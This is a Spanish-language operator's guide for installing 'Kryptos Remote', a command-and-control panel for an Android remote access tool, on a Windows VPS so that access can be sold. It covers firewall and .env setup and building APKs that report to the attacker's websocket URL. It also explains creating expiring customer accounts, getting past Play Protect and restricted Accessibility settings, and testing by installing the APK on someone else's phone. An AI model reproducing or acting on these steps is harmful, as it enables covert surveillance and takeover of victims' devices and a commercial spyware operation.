# KRYPTOS REMOTE — INSTALACIÓN EN VPS WINDOWS

> Guía para montar el C&C en un VPS Windows con IP pública y vender accesos.
> Última actualización: 17/10/2026
> Puerto: 7771

---

## ÍNDICE

1. [Por qué Windows es más fácil](#1-por-qué-windows-es-más-fácil)
2. [Requisitos del VPS](#2-requisitos-del-vps)
3. [Contratar el VPS](#3-contratar-el-vps)
4. [Preparar el VPS](#4-preparar-el-vps)
5. [Subir el proyecto](#5-subir-el-proyecto)
6. [Configurar el .env](#6-configurar-el-env)
7. [Firewall (Windows + proveedor)](#7-firewall)
8. [Arrancar el servidor](#8-arrancar-el-servidor)
9. [Auto-arranque tras reiniciar](#9-auto-arranque-tras-reiniciar)
10. [Verificación](#10-verificación)
11. [Cleartext (importante)](#11-cleartext)
12. [Opcional: dominio + HTTPS](#12-opcional-dominio--https)
13. [Crear usuarios y links](#13-crear-usuarios-y-links)
14. [Generar el APK](#14-generar-el-apk)
15. [Seguridad](#15-seguridad)
16. [Si cambia la IP](#16-si-cambia-la-ip)
17. [Problemas conocidos](#17-problemas-conocidos)
18. [Checklist final](#18-checklist-final)
19. [Resumen de links](#19-resumen-de-links)

---

## 1. POR QUÉ WINDOWS ES MÁS FÁCIL

- El `INSTALAR_Y_ARRANCAR.bat` **ya está hecho para Windows** y funciona tal cual.
- El `sign_release_apk.ps1` (firma del APK) funciona nativo.
- Cero problemas de rutas Linux vs Windows.
- Cero problemas con `gradlew` vs `gradlew.bat`.

El `.bat` ya hace TODO solo: instala dependencias, crea el venv, abre el
firewall, detecta la IP pública, escribe el `.env`, crea la BD y arranca el
servidor con reinicio automático.

**Contra:** el VPS Windows cuesta un poco más que uno Linux (licencia).
Calcula $10-20/mes.

---

## 2. REQUISITOS DEL VPS

- **Windows Server 2019 o 2022**
- **4 vCPU / 8 GB RAM / 60 GB SSD** (mínimo 4 GB de RAM)
- IP pública
- Acceso RDP (Escritorio Remoto)

> Con 2 GB de RAM el build de APK muere. Con 4 GB va justo.

---

## 3. CONTRATAR EL VPS

Proveedores con Windows:

| Proveedor | Precio aprox. | Notas |
|---|---|---|
| Contabo | €9/mes | Buen precio, RAM alta |
| Hetzner Cloud | €14/mes | Muy confiable |
| Vultr | $16/mes | Buen panel |
| DigitalOcean | $16/mes | Fácil |

Al contratar guarda:
- **IP pública**
- **Usuario y contraseña de administrador**

---

## 4. PREPARAR EL VPS

### 4.1 Conectarte

Windows: abre **Conexión a Escritorio Remoto** (`mstsc`), pon la IP, usuario
y contraseña del VPS.

### 4.2 Instalar Python

Descarga Python 3.12 desde https://www.python.org/downloads/ y al instalar
**marca "Add Python to PATH"**.

Verifica en CMD:
```bat
python --version
```

### 4.3 Excluir el proyecto del Defender

Windows Defender escanea cada archivo del build y lo hace lento. Añade la
carpeta del proyecto a las exclusiones: Seguridad de Windows → Protección
antivirus → Exclusiones.

---

## 5. SUBIR EL PROYECTO

Sube **todo el proyecto** a, por ejemplo, `C:\gangstar\`.

Puedes usar RDP (copiar/pegar entre tu PC y el VPS funciona con archivos),
o FileZilla, o WeTransfer + descarga en el VPS.

**SÍ incluir:** `main.py`, `apk_builder.py`, `gangstar_env.py`, `auth.py`,
`models.py`, `database.py`, `schemas.py`, `web-dist/`, `web-app/`, `web/`,
`downloads/`, `android-rat/`, `requirements.txt`, `.env`, el `.bat`.

**NO incluir:** `venv/` y `__pycache__/`.

**Si migras la BD:** copia `gangstar_local.db` junto con sus `-wal` y `-shm`.

---

## 6. CONFIGURAR EL `.ENV`

Borra el `.env` que traías (para que el `.bat` lo regenere con la IP del VPS),
o edítalo a mano. Debe quedar:

```
SERVER_URL=http://IP_DEL_VPS:7771
SERVER_WS_URL=ws://IP_DEL_VPS:7771/ws
KRYPTOS_HOST=0.0.0.0
KRYPTOS_PORT=7771
DATABASE_URL=sqlite:///gangstar_local.db
```

Reemplaza `IP_DEL_VPS` por la IP pública del VPS.

> Si tienes un `.env.vps`, ponle la misma URL.

---

## 7. FIREWALL

### 7.1 Windows Firewall

El `.bat` ya abre el 7771, pero por si acaso:

```bat
netsh advfirewall firewall add rule name="Kryptos 7771" dir=in action=allow protocol=TCP localport=7771
```

### 7.2 Firewall del proveedor (¡crítico!)

En el panel del proveedor (Contabo/Hetzner/Vultr/etc.) abre el puerto
**7771 TCP**. Si no lo haces, nadie llega desde fuera aunque el Windows
Firewall esté abierto.

---

## 8. ARRANCAR EL SERVIDOR

Doble clic a `INSTALAR_Y_ARRANCAR.bat` (acepta el UAC). Va a:

1. Instalar Python y dependencias
2. Instalar el Android SDK
3. Abrir el firewall
4. Detectar la IP pública y escribir el `.env`
5. Crear la BD y el admin
6. Arrancar el servidor con reinicio automático

Espera a que termine. Debe decir:

```
SERVIDOR RODANDO
Local: http://localhost:7771
Rede:  http://IP_DEL_VPS:7771
```

Y luego:
```
INFO:main:WebSocket: ws://IP_DEL_VPS:7771/ws
INFO:main:Painel Web: http://IP_DEL_VPS:7771
```

---

## 9. AUTO-ARRANQUE TRAS REINICIAR

Si el VPS se reinicia y nadie entra por RDP, el servidor no arranca solo.
Configúralo:

1. Abre **Programador de tareas** → **Crear tarea**
2. General → **Ejecutar con privilegios más altos**
3. Desencadenadores → **Al iniciar el sistema**
4. Acciones → **Iniciar un programa** → `C:\gangstar\INSTALAR_Y_ARRANCAR.bat`
5. Aceptar y pon tu contraseña cuando la pida

Así arranca solo cada vez que el VPS enciende.

---

## 10. VERIFICACIÓN

En el VPS:
```bat
netstat -ano | findstr :7771
```
Debe mostrar `LISTENING`.

Desde tu PC o celular (con WiFi, sin nada raro):
```
http://IP_DEL_VPS:7771
```
Debe cargar el panel.

---

## 11. CLEARTEXT

Con `http://` y `ws://` (sin HTTPS) **Android bloquea el tráfico no cifrado**
por defecto. Hay que permitirlo en el APK, o no conectará.

Abre:
```
C:\gangstar\android-rat\app\src\main\AndroidManifest.xml
```

Busca la etiqueta `<application` y asegúrate de que tenga
`android:usesCleartextTraffic="true"`. Si no lo tiene, agrégalo:

```xml
<application
    android:usesCleartextTraffic="true"
    ... >
```

Si lo cambias, hay que reconstruir el APK.

---

## 12. OPCIONAL: DOMINIO + HTTPS

Si quieres `https://` (evita el problema de cleartext y se ve profesional):

1. Compra un dominio (o usa `panel.TU-IP-CON-GUIONES.sslip.io` gratis)
2. Apunta un registro A a la IP del VPS
3. Instala **Caddy para Windows** (https://caddyserver.com/download)
4. Crea `C:\caddy\Caddyfile`:

```
panel.tudominio.com {
    reverse_proxy 127.0.0.1:7771 {
        transport http {
            read_timeout 0
            write_timeout 0
        }
    }
}
```

5. Abre el puerto 80 y 443 en el firewall del proveedor
6. `caddy run` (o instálalo como servicio: `caddy install`)

Luego cambia el `.env` a:
```
SERVER_URL=https://panel.tudominio.com
SERVER_WS_URL=wss://panel.tudominio.com/ws
```

---

## 13. CREAR USUARIOS Y LINKS

1. Entra como `admin` a:
   ```
   http://IP_DEL_VPS:7771/#/admin
   ```
   (ojo: con `#`, el panel usa rutas hash)

2. Crea la cuenta: usuario, email, contraseña, días de expiración.

3. Envía a la persona:
   ```
   URL:        http://IP_DEL_VPS:7771/
   Usuario:    pepe
   Contraseña: (la que pusiste)
   ```

Cada uno ve **solo sus dispositivos y sus APKs**. El aislamiento ya está hecho.

---

## 14. GENERAR EL APK

Desde el panel, ya logueado. En el log del servidor debe aparecer:

```
[URL] URL do servidor atualizada: ws://IP_DEL_VPS:7771/ws?build_id=XXXX
```

---

## 15. SEGURIDAD

1. **CAMBIA la contraseña del admin** (viene `admin`/`admin`).
2. **RDP:** cambia la contraseña del usuario Windows. Opcional: cambia el
   puerto RDP (3389) y limita por IP.
3. **2FA:** cada usuario configura Google Authenticator la primera vez.
4. **HWID:** decide si lo dejas (ata la cuenta a un PC) o lo desactivas.
5. **Expiración:** usa `expiration_days` para vender por meses.
6. **Backup de la BD** cada día (Programador de tareas → copiar
   `gangstar_local.db` a otra carpeta).

---

## 16. SI CAMBIA LA IP

1. Actualiza `SERVER_URL` y `SERVER_WS_URL` en `.env`
2. Reinicia el servidor
3. **Regenera TODOS los APKs**

Un APK lleva la URL grabada. Si la IP cambia, los APKs viejos dejan de conectar.

---

## 17. PROBLEMAS CONOCIDOS

| Síntoma | Causa | Solución |
|---|---|---|
| Nadie llega desde fuera | Puerto 7771 cerrado en el proveedor | Ábrelo en el panel del proveedor |
| Panel en blanco | Servidor caído | Reinicia el `.bat` |
| APK instala pero no aparece | APK con URL vieja | Regenera el APK |
| APK instala pero no conecta | Cleartext | `usesCleartextTraffic="true"` |
| Puerto 10048 al arrancar | Servidor viejo corriendo | Cierra la otra ventana / mata `python.exe` |
| Accesibilidad en gris | Ajustes restringidos | Ajustes → Apps → app → ⋮ → Permitir ajustes restringidos |
| Play Protect bloquea | APK sin firmar | "Instalar de todas formas" |
| Build muy lento | Defender | Añade exclusión de la carpeta |

---

## 18. CHECKLIST FINAL

- [ ] VPS Windows contratado (8 GB RAM)
- [ ] Python 3.12 instalado con "Add to PATH"
- [ ] Proyecto en `C:\gangstar\`
- [ ] Puerto 7771 abierto en Windows Firewall **y en el proveedor**
- [ ] `.env` con la IP del VPS
- [ ] `.bat` corriendo sin errores
- [ ] Tarea programada para auto-arranque
- [ ] `usesCleartextTraffic="true"` en el manifest
- [ ] Contraseña de admin cambiada
- [ ] Panel carga desde fuera: `http://IP_DEL_VPS:7771`
- [ ] Usuario de prueba creado
- [ ] APK de prueba construido y `[URL]` verificada
- [ ] APK instalado en un móvil ajeno → aparece en el panel

---

## 19. RESUMEN DE LINKS

| Qué | Link |
|---|---|
| Panel (lo que envías) | `http://IP_DEL_VPS:7771/` |
| Login directo | `http://IP_DEL_VPS:7771/#/login` |
| Admin / usuarios | `http://IP_DEL_VPS:7771/#/admin` |

*(Con dominio: reemplaza `http://IP_DEL_VPS:7771` por `https://panel.tudominio.com`)*

---

## COMANDOS ÚTILES

```bat
netstat -ano | findstr :7771
tasklist | findstr python
taskkill /F /IM python.exe
```

---

*Fin del documento.*